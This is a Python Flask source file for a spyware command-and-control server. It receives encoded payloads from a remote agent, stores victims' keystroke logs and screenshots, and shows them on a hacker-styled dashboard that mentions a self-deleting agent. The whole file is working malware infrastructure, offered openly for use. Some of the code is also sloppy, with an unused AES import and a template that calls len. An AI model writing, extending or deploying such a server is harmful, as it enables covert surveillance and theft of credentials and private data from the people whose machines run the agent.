from flask import Flask, request, jsonify, send_from_directory, render_template_string
import base64
import zlib
import json
from Crypto.Cipher import AES
import os
import datetime
from collections import defaultdict
import plotly.graph_objects as go
import plotly.utils
from plotly.subplots import make_subplots

app = Flask(__name__)
os.makedirs("c2_data", exist_ok=True)
for d in ["c2_data/logs", "c2_data/keys", "c2_data/screenshots"]:
    os.makedirs(d, exist_ok=True)

KEY = b'\x00'*32  # Fixed for demo
IV = b'\x00'*16

@app.route("/receive", methods=["POST"])
def receive():
    try:
        data = request.json["data"]
        # Simplified decrypt (match agent)
        payload = json.loads(zlib.decompress(base64.b64decode(data)).decode())
        
        session = payload["session_id"]
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save files
        with open(f"c2_data/logs/{session}_{ts}.json", "w") as f:
            json.dump(payload, f, indent=2)
        
        if payload.get("keys"):
            with open(f"c2_data/keys/{session}_{ts}.txt", "w", encoding="utf-8") as f:
                f.write(payload["keys"])
        
        for shot in payload.get("screenshot_data", []):
            with open(f"c2_data/screenshots/{shot['filename']}", "wb") as f:
                f.write(base64.b64decode(shot['data']))
        
        return jsonify({"status": "ok"})
    except:
        return jsonify({"error": "fail"}), 400

@app.route("/")
def dashboard():
    shots = os.listdir("c2_data/screenshots")[-12:]
    keys = os.listdir("c2_data/keys")[-8:]
    
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 Ultimate C2 Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');
        * { font-family: 'Fira Code', monospace; }
        .glow { box-shadow: 0 0 20px #10ff00, inset 0 0 20px #10ff0050; }
    </style>
</head>
<body class="bg-gradient-to-br from-black to-gray-900 text-green-400 min-h-screen p-8">
    <div class="max-w-7xl mx-auto">
        <h1 class="text-5xl font-bold text-center mb-12 glow">🔥 ULTIMATE C2 DASHBOARD</h1>
        
        <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
                <h2 class="text-3xl">{{ len(shots) }}</h2>
                <p>📸 Screenshots</p>
            </div>
            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
                <h2 class="text-3xl">{{ len(keys) }}</h2>
                <p>⌨️ Keylogs</p>
            </div>
            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
                <h2 class="text-3xl">LIVE</h2>
                <p>🟢 Active Sessions</p>
            </div>
        </div>
        
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500">
                <h3 class="text-2xl mb-6">🖼️ Latest Screenshots</h3>
                {% for shot in shots %}
                <a href="/shots/{{ shot }}" target="_blank">
                    <img src="/shots/{{ shot }}" class="w-full h-48 object-cover rounded-lg mb-4 border-2 border-green-500 hover:glow transition-all">
                </a>
                {% endfor %}
            </div>
            
            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 max-h-96 overflow-y-auto">
                <h3 class="text-2xl mb-6">⌨️ Latest Keylogs</h3>
                {% for key in keys %}
                <a href="/keys/{{ key }}" target="_blank" class="block p-4 mb-4 bg-gray-800 rounded-lg border-l-4 border-green-500 hover:bg-gray-700">
                    <strong>{{ key }}</strong>
                </a>
                {% endfor %}
            </div>
        </div>
        
        <div class="text-center text-lg">
            <p class="mb-4">🛑 <strong>Ctrl+Alt+Q</strong> = Stop Agent | <strong>ESC</strong> = Self-Delete</p>
            <p>Last update: {{ now }}</p>
        </div>
    </div>
</body>
</html>
    """, shots=shots, keys=keys, now=datetime.datetime.now())

@app.route("/shots/<path:filename>")
def serve_shot(filename):
    return send_from_directory("c2_data/screenshots", filename)

@app.route("/keys/<path:filename>")
def serve_key(filename):
    path = f"c2_data/keys/{filename}"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
        return f"""
        <div style="font-family:monospace;background:black;color:lime;padding:40px;font-size:16px;height:100vh;overflow:auto">
            <h1 style="color:lime;margin-bottom:20px">{filename}</h1>
            <pre style="white-space:pre-wrap;word-break:break-all">{content}</pre>
        </div>
        """
    return "Not found", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))